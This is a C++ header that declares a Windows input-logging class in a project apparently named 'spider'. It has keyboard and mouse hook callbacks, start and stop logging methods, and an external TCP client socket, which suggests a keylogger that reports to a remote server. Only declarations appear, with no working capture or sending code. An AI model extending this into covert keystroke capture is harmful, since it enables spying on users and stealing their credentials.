#pragma once

#ifndef WINDOWS_INPUT_HANDLER_HPP_
# define WINDOWS_INPUT_HANDLER_HPP_

# include <Windows.h>
# include "socket/socketC/clientTcpSocketC.hpp"

# define RANDOM_ID 666

extern spider::socket::ClientTcpSocket sock;

namespace spider
{
	class WindowsInputHandler
	{
	public:
		WindowsInputHandler(LPVOID lpParam);
		~WindowsInputHandler();

	private:
		WindowsInputHandler() {}
		WindowsInputHandler(WindowsInputHandler& other) {}

	public:
		int				startLogging(bool keyboard, bool mouse);
		int				stopLogging(bool keyboard, bool mouse);
		const bool		isLogging() const;

		static			LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
		static			LRESULT CALLBACK mouseProc(int nCode, WPARAM wParam, LPARAM lParam);
		static			bool isKeyDown(int key);
		static			bool isAsyncKeyDown(int key);

		static HHOOK	_keyboardHook;
		static HHOOK	_mouseHook;

	protected:
		LPVOID			_lpParam;
		HINSTANCE		_hInstance;
		bool			_isLogging;

		int				_registerKeyboardHook();
		int				_registerMouseHook();
		int				_unregisterKeyboardHook();
		int				_unregisterMouseHook();
	};
}

#endif // !WINDOWS_INPUT_HANDLER_HPP_